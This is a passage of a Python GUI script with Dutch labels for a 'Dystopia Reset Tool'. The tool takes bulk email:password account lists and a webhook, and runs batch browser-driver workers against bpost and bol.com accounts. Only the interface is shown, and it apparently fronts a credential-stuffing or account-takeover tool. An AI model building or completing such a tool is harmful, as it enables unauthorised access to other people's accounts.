        bio = BytesIO()
        frame.save(bio, format='PNG')
        frames.append(bio.getvalue())
    return frames

def main():
    # 1) Custom 'Dystopia' theme
    sg.LOOK_AND_FEEL_TABLE['Dystopia'] = {
        'BACKGROUND':       '#0D0D0D',
        'TEXT':             '#00FF66',
        'INPUT':            '#1A1A1A',
        'TEXT_INPUT':       '#00FF66',
        'BUTTON':           ('#0D0D0D', '#00FF66'),
        'SCROLL':           '#333333',
        'PROGRESS':         ('#00FF66', '#0D0D0D'),
        'BORDER':           1,
        'SLIDER_DEPTH':     0,
        'PROGRESS_DEPTH':   0
    }
    sg.theme('Dystopia')

    # 2) Styles
    font_header    = ('Consolas', 20, 'bold')
    font_subheader = ('Consolas', 14)
    font_text      = ('Consolas', 11)
    button_style   = {'font': ('Consolas', 12), 'border_width': 1, 'pad': (6,4)}

    # 3) Menu
    menu_def = [['&File', ['&Exit']], ['&Help', ['&About']]]

    # 4) Input frame
    input_frame = sg.Frame(
        'Account Configuratie',
        [[sg.Text('Accounts (email:password):', font=font_subheader)],
         [sg.Multiline(key='-ACCOUNTS-', size=(40,10),
                       background_color='#1A1A1A', text_color='#00FF66', font=font_text)],
         [sg.Text('Webhooks (optioneel):', font=font_subheader)],
         [sg.Input(key='-WEBHOOK-', size=(40,1),
                   background_color='#1A1A1A', text_color='#00FF66', font=font_text)]],
        title_color='#00FF66', relief='groove'
    )

    # 5) Status frame + sparkline + loader
    spark = sg.Graph(canvas_size=(200, 60), graph_bottom_left=(0,0),
                     graph_top_right=(100,60), key='-SPARK-',
                     background_color='#1A1A1A')
    loader_frames = load_gif_frames('spinner.gif')
    status_frame = sg.Frame(
        'Systeemstatus',
        [[
            sg.Column([[sg.Multiline(key='-STATUS-', size=(40,10),
                             disabled=True, autoscroll=True,
                             background_color='#333333',
                             text_color='#00FF66', font=font_text)]]),
            sg.Column([ [spark], [sg.Image(data=loader_frames[0], key='-LOADER-')] ])
        ]],
        title_color='#00FF66', relief='groove'
    )

    # 6) Controls en progress bar
    control_row  = [
    sg.Button('Start',     key='-START-', **button_style),
    sg.Button('Stop',      key='-STOP-',  **button_style),
    sg.Button('Verwijder', key='-CLEAR-', **button_style), # ← toegevoegde knop
    sg.Button('Afsluiten', key='-EXIT-',  **button_style)
    ]
    progress_bar = sg.ProgressBar(max_value=100, orientation='h',
                                 size=(50, 15), key='-PROGRESS-')

    # 7) Layout
    title_elem = sg.Text(
    '🔐 AUTOMATISCH BPOST & BOL.COM RESET 🔄',
    key='-TITLE-',
    font=font_header,
    justification='center',
    expand_x=True,
    text_color='#FFFFFF',
    background_color='#1F1F1F',
    pad=(0, 20)
    )
    
    layout = [
        [sg.Text('Gemaakt door Bnx187', font=('Consolas', 10), text_color='#00FF66', background_color='#0D0D0D')],
        [sg.Menu(menu_def, background_color='#0D0D0D',
                 text_color='#00FF66', disabled_text_color='#555555',
                 font=font_text)],
        [title_elem],
        [sg.Column([[input_frame]]),
         sg.VerticalSeparator(color='#333333'),
         sg.Column([[status_frame]])],
        [progress_bar],
        [sg.Column([control_row], justification='center')]
    ]

    # 8) Window
    window = sg.Window(
        'Dystopia Reset Tool', layout,
        resizable=True, background_color='#0D0D0D',
        finalize=True, element_justification='center'
    )

    # Hover‑effects op buttons
    for key in ('-START-', '-STOP-', '-EXIT-'):
        btn = window[key].Widget
        btn.bind("<Enter>", lambda e, b=btn: b.config(bg='#00FF66', fg='#0D0D0D'))
        btn.bind("<Leave>", lambda e, b=btn: b.config(bg='#0D0D0D', fg='#00FF66'))

    # 9) Event loop + animaties
    frame = loader_idx = hue_t = 0
    spark_data = []
    while True:
        event, values = window.read(timeout=50)
        if event == sg.WIN_CLOSED:
         break

        if random.random() < 0.02:
            # korte “glitch” fase
            window['-TITLE-'].update(
                '𝔻𝕐𝕊𝕋𝕆ℙ𝕀𝔸 𝗥𝗘𝗦𝗘𝗧 𝗧𝗢𝗢𝗟',
                text_color=random.choice(['#FF0055', '#FF00AA', '#AA0055']),
                background_color=random.choice(['#111111', '#220022', '#550011'])
            )
        else:
            # normale titel met subtiele flicker‑kleur
            # flicker: variërend groen over de frames
            flick = int((math.sin(frame/3) + 1) / 2 * 255)
            hex_flick = f'00{flick:02X}66'  # van donker naar fel groen
            window['-TITLE-'].update(
                '🔐 AUTOMATISCH BPOST & BOL.COM RESET 🔄',
                text_color=f'#{hex_flick}',
                background_color='#1F1F1F'
            )

        # **Verwijder deze regel:** frame += 1 hier, omdat je het al doet bij de A) en B) secties
        # frame += 1  

        # Afsluiten
        if event in (sg.WIN_CLOSED, '-EXIT-'):
            for drv in globals().get('all_drivers', []):
                try: drv.quit()
                except: pass
            break

        # Start batch
        if event == '-START-':
            raw = values['-ACCOUNTS-'].strip()
            if not raw:
                sg.popup_error("Vul minstens één regel in met email:password")
                continue
            threading.Thread(target=batch_worker, args=(raw.splitlines(), window), daemon=True).start()

        # Stop batch
        if event == '-STOP-':
            print_status(window,
                         f"{Fore.YELLOW}⏹️ Proces onderbroken door gebruiker.{Style.RESET_ALL}")
            
        if event == '-CLEAR-':
            window['-ACCOUNTS-'].update('')    

        # Log update
        if event == '_LOG_':
            try:
                text, color = values['_LOG_']
                window['-STATUS-'].print(text, text_color=color)
            except Exception as e:
                print(f"LOG error: {e}")

        # A) Knipperende titel
        alpha = int((math.sin(frame/5) + 1) / 2 * 255)
        window['-TITLE-'].update(text_color='#00FF66')

        # B) Loader‑GIF
        loader_idx = (loader_idx + 1) % len(loader_frames)
        window['-LOADER-'].update(data=loader_frames[loader_idx])

        # C) Sparkline
        spark_data.append(random.randint(0, 60))
        if len(spark_data) > 100: spark_data.pop(0)
        window['-SPARK-'].erase()
        for i, y in enumerate(spark_data):
            window['-SPARK-'].draw_line((i, y), (i, 0))

        # D) Achtergrond kleurverloop
        h = (hue_t % 360) / 360
        r, g, b = colorsys.hsv_to_rgb(h, 0.5, 0.1)
        window.TKroot.config(bg=f'#{int(r*255):02x}{int(g*255):02x}{int(b*255):02x}')
        hue_t += 1

    window.close()

if __name__ == '__main__':
    main()